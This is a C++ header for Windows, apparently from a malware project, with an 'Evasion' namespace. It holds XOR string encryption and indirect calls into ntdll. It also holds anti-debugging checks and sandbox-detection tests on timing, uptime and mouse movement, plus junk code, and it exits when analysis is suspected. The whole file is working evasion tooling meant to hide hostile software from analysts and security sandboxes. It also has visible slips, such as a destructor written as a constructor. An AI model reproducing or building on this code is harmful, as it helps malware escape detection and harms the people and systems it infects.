#pragma once
#include <windows.h>
#include <winternl.h>
#include <string>

namespace Evasion
{
    constexpr char xorKey = 0x7D;

    inline void xorString(char *str, size_t len)
    {
        for (size_t i = 0; i < len; i++)
        {
            str[i] ^= xorKey;
        }
    }

    class EncString
    {
    private:
        char *data;
        size_t length;

    public:
        EncString(const char *str)
        {
            length = strlen(str);
            data = new char[length + 1];
            memcpy(data, str, length + 1);
            xorString(data, length);
        }

        EncString()
        {
            if (data)
            {
                SecureZeroMemory(data, length);
                delete[] data;
            }
        }

        std::string decrypt()
        {
            char *temp = new char[length + 1];
            memcpy(temp, data, length + 1);
            xorString(temp, length);
            std::string result(temp);
            SecureZeroMemory(temp, length);
            delete[] temp;
            return result;
        }
    };

    inline void ObfuscatedSleep(DWORD milliseconds)
    {
        typedef NTSTATUS(NTAPI * pNtDelayExecution)(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);

        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll)
            return;

        auto NtDelayExecution = (pNtDelayExecution)GetProcAddress(hNtdll, "NtDelayExecution");
        if (!NtDelayExecution)
        {
            Sleep(milliseconds);
            return;
        }

        LARGE_INTEGER interval;
        interval.QuadPart = -10000LL * milliseconds;
        NtDelayExecution(FALSE, &interval);
    }

    inline bool TimeCheck()
    {
        DWORD startTime = GetTickCount();
        ObfuscatedSleep(2000);
        DWORD elapsed = GetTickCount() - startTime;

        return (elapsed >= 1800 && elapsed <= 2200);
    }

    inline bool UserActivityCheck()
    {
        POINT p1, p2;
        GetCursorPos(&p1);
        ObfuscatedSleep(3000);
        GetCursorPos(&p2);

        return (p1.x != p2.x || p1.y != p2.y);
    }

    inline bool UptimeCheck()
    {
        DWORD uptime = GetTickCount() / 1000;
        return (uptime > 600);
    }

    inline bool AntiDebug()
    {
        if (IsDebuggerPresent())
            return true;

        BOOL isDebuggerPresent = FALSE;
        typedef NTSTATUS(NTAPI * pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll)
        {
            auto NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
            if (NtQueryInformationProcess)
            {
                DWORD debugPort = 0;
                NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL);
                if (NT_SUCCESS(status) && debugPort != 0)
                    return true;
            }
        }

        CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);
        return isDebuggerPresent;
    }

    inline void JunkCode()
    {
        volatile int x = 0;
        for (int i = 0; i < 10; i++)
        {
            x += i * 2;
            x -= i;
            x ^= 0xDEADBEEF;
        }
    }

    inline bool RunEvasionChecks()
    {
        JunkCode();

        if (AntiDebug())
        {
            ExitProcess(0);
            return false;
        }

        JunkCode();

        if (!TimeCheck())
        {
            ExitProcess(0);
            return false;
        }

        if (!UptimeCheck())
        {
            ObfuscatedSleep(10000);
            if (!UptimeCheck())
            {
                ExitProcess(0);
                return false;
            }
        }

        JunkCode();

        UserActivityCheck();

        return true;
    }

} // namespace Evasion
